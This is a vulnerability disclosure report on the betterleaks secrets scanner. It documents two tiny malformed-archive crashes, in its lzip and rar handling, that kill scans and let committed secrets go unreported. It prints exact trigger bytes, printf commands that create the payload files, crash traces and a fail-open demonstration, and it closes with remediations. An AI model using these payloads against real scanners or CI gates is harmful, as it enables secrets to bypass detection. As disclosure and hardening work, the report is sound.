# Betterleaks — Zero-Day Security Findings

**Target:** `github.com/betterleaks/betterleaks` (a fork of Gitleaks; a secrets scanner)
**Method:** First-principles source analysis of betterleaks and its dependency tree. No
git-history/patch diffing was used. Dependencies were cloned from the module cache and
audited directly.

**Result:** Two independent, remotely-triggerable **denial-of-service (process crash)**
zero-days that fire with **default flags on every scan mode**, plus a demonstrated
**fail-open secret-scanning bypass**. Both are single-file triggers of a few bytes.

---

## Attacker model

Betterleaks is designed to be pointed at **untrusted content**: local directories
(`betterleaks dir`), git repositories and PRs (`betterleaks git` / `github` / `gitlab`),
remote object stores (`s3`, `huggingface`), and `stdin`. The attacker controls the bytes
of any file that is scanned (e.g. a file committed to a PR, an object in a bucket, a file
in a directory).

Two structural facts make this fork fragile:

1. **Archives are auto-identified by *file extension*.** When scanning a non-`.tar`
   file, `sources/file.go:101` calls `archives.Identify(ctx, s.Path, nil)` with a **nil
   stream**, so mholt/archives selects the decompressor/extractor purely from the file
   name. The attacker fully controls both the extension **and** the bytes, and the bytes
   are then fed into the matching (C-port) decompression library.
2. **There is no `recover()` anywhere in the codebase.** A `grep` for `recover(` across
   the entire tree returns nothing. Scanning runs inside `fatih/semgroup` worker
   goroutines (`sources/files.go`, `sources/git.go`), so **any** panic raised while
   parsing attacker bytes propagates to the top of a goroutine and terminates the whole
   process with `os` exit code 2.

Together: *a tiny, malformed archive with the right extension crashes the scanner.*

---

## Finding #1 — `lzip` negative slice bound (6-byte `.lz`) → process crash

**Severity:** High (unauthenticated DoS / scan bypass, default config)
**Root cause:** `github.com/sorairolake/lzip-go@v0.3.8`, `reader.go:66`

```go
// lzip-go reader.go (NewReader)
rb, err := io.ReadAll(r)           // rb = everything after the 6-byte lzip header
...
var lzmaHeader [lzma.HeaderLen]byte
lzmaHeader[0] = ...
binary.LittleEndian.PutUint32(lzmaHeader[1:5], dictSize)
copy(lzmaHeader[5:], rb[len(rb)-16:len(rb)-8])   // <-- no check that len(rb) >= 16
```

When the post-header body is shorter than 16 bytes, `len(rb)-16` is negative and the
slice expression panics (`slice bounds out of range`). The header validation above
(magic `LZIP`, version, dictionary size) is satisfied by a 6-byte file, so a file that is
*only* a header reaches line 66 with `len(rb) == 0`.

**Reachability in betterleaks:**
`file extension ".lz"` → `archives.Identify` → `Lzip` decompressor
→ `sources/file.go:208 decompressorFragments` → `mholt/archives` `Lzip.OpenReader`
(`lzip.go:46`) → `lzip-go.NewReader` (`reader.go:66`) → **panic** → exit 2.

**Trigger (6 bytes):**
```
4c 5a 49 50 01 17            # "LZIP" + version 0x01 + dict-size byte 0x17
```

**Observed crash:**
```
panic: runtime error: slice bounds out of range [:-8]
github.com/sorairolake/lzip-go.NewReader(...)                 reader.go:66
github.com/mholt/archives.Lzip.OpenReader(...)                lzip.go:46
.../sources.(*File).decompressorFragments(...)                sources/file.go:208
.../sources.(*File).Fragments(...)                            sources/file.go:132
exit status 2
```

---

## Finding #2 — `rar` undersized-buffer slice (16-byte `.rar`) → process crash

**Severity:** High (unauthenticated DoS / scan bypass, default config)
**Root cause:** `github.com/nwaples/rardecode/v2@v2.2.2`, `archive50.go:499-503`

```go
// rardecode/v2 archive50.go (readBlockHeader)
crc := b.uint32()                       // consumes 4 of the 7 header bytes
size := int(b.uvarint())                // attacker-controlled "header size" varint
buf := make([]byte, 3+size-len(b))      // <-- can be < 3 when size is small
copy(buf, sizeBuf[4:])
_, err = io.ReadFull(r, buf[3:])        // <-- buf[3:] panics when len(buf) < 3
```

There is no check that `size` is large enough for `len(buf) >= 3`. With a RAR5 file whose
block header encodes `size == 0`, `buf` is allocated with length `1`, and `buf[3:]`
panics (`slice bounds out of range [3:1]`).

**Reachability in betterleaks:**
`file extension ".rar"` → `archives.Identify` → `Rar` extractor
→ `sources/file.go:169 extractorFragments` → `mholt/archives` `Rar.Extract`
(`rar.go:109`) → `rardecode/v2.NewReader` → `newVolume` → `readerVolume.init`
→ `archive50.init` → `mustReadBlockHeader` → **panic** → exit 2.

**Trigger (16 bytes):**
```
52 61 72 21 1a 07 01 00      # RAR5 signature "Rar!\x1a\x07\x01\x00"
00 00 00 00 00 00 00 00      # 8 zero bytes (block header parses size=0)
```

**Observed crash:**
```
panic: runtime error: slice bounds out of range [3:1]
github.com/nwaples/rardecode/v2.(*archive50).mustReadBlockHeader(...)  archive50.go:547
github.com/nwaples/rardecode/v2.(*archive50).init(...)                 archive50.go:560
github.com/mholt/archives.Rar.Extract(...)                             rar.go:109
.../sources.(*File).extractorFragments(...)                            sources/file.go:169
.../sources.(*File).Fragments(...)                                     sources/file.go:128
exit status 2
```

---

## Demonstrated impact: DoS **and** fail-open secret-scanning bypass

Both bugs kill the process before findings are printed. In a CI/pre-commit gate this is a
**fail-open** condition: a malicious PR that includes a few-byte archive crashes the
scanner, so real secrets committed in the same change are never reported.

Reproduced with the built binary (default flags):

```
# baseline: directory with a real, detectable token only
$ betterleaks dir demo_dir
WRN leaks found: 1                       # secret detected, exit 0

# attack: same token + a 16-byte payload.rar in the same directory
$ betterleaks dir demo_dir
panic: runtime error: slice bounds out of range [3:1]
exit status 2                            # scanner crashed, secret NOT reported
```

The same crash occurs in `betterleaks git` (the payload's NUL bytes make git mark it
binary → it is routed through the archive path via `sources/git.go`), so scanning any
untrusted repository or GitHub/GitLab URL that contains such a file crashes the scan.

**Affected scan modes:** `dir`, `git`, `github`, `gitlab`, `s3`, `huggingface`, `stdin`
— all build a `sources.File`/`Git` pipeline that routes archives through
`sources/file.go`.

---

## Reproducers

Self-contained Go tests assert both panics (they pass while the bug is present):

- `sources/archive_crash_repro_test.go` — `TestLzipTinyFilePanics`, `TestRarTinyFilePanics`

```
go test ./sources/ -run 'TestLzipTinyFilePanics|TestRarTinyFilePanics' -v
```

End-to-end (whole-process crash) reproduction:

```
mkdir victim
printf 'LZIP\x01\x17' > victim/evil.lz                                  # Finding #1
# or:
printf 'Rar!\x1a\x07\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00' > victim/evil.rar  # Finding #2
betterleaks dir victim        # panics, exit status 2
```

---

## Suggested remediations

- **Contain panics on the scan path.** Wrap per-file archive handling
  (`extractorFragments` / `decompressorFragments` in `sources/file.go`) in a `recover()`
  that logs and skips the offending file, so no single input can terminate a scan. This
  alone neutralizes both findings and hardens against the entire class.
- **Do not identify archive formats by attacker-controlled extension alone.** Sniff magic
  bytes (`archives.Identify` with the real stream) before dispatching to a decompressor.
- **Bound decompression** (size/entry/nesting caps are partially present via
  `--max-archive-depth`, but a crash occurs before any of that applies).
- Upgrade / patch the upstream libraries:
  - `sorairolake/lzip-go`: guard `len(rb) >= 16` before the `rb[len(rb)-16:len(rb)-8]`
    copy in `reader.go`.
  - `nwaples/rardecode/v2`: validate `size`/`len(buf) >= 3` before `buf[3:]` in
    `archive50.go`.

---

## Routes investigated and ruled out (negative results)

To avoid tunnel vision, several other attacker-facing surfaces were developed
independently and tested to exhaustion; they did **not** yield a working exploit:

| Route | Verdict | Evidence |
|---|---|---|
| **`betterleaks/go-re2` fork** (regex engine) | Clean at depth | Differential vs stdlib + 32/64-goroutine stress with adversarial UTF-8/NUL/ReDoS/1 MB inputs, ~1M+ ops, no OOB/corruption/mismatch (`regexp/re2/zzz_*_test.go`). |
| **Codec decoders** (base64/hex/percent/unicode + offset remapping) | Clean at depth | `FuzzDecodePanic` on the real `DetectString` path: 1.16 M executions, no crash; offset-invariant harness found no OOB (`detect/fuzz_codec_test.go`, `detect/invariant_codec_test.go`). |
| **Config-driven Expr** (`filter`/`prefilter`) | No escalation | `filter`/`prefilter` modes expose no `http`/`env`/`exec`; only DoS-via-regex, which is subsumed by controlling the config anyway. |
| **Config-driven Expr `validate`** (SSRF / secret exfil) | Real but gated | `validate` can `http.get` internal endpoints / exfil secrets, **but only under `--validation` (default off)**. Secondary. |
| Other decompressors/extractors (gz, bz2, xz, zstd, lz4, brotli, snappy, minlz, zlib, zip, 7z, tar) | Survive | Same malformed-input sweep that found lzip+rar; no panics. |
| `git` argument handling / clone | Hardened | `GIT_CONFIG_GLOBAL=/dev/null`, `GIT_CONFIG_NOSYSTEM=1`, fixed argv; no shell. |
| `go-gitdiff` parsing | Low | Only ever parses local `git log -p` / `git diff` output, not raw attacker bytes. |
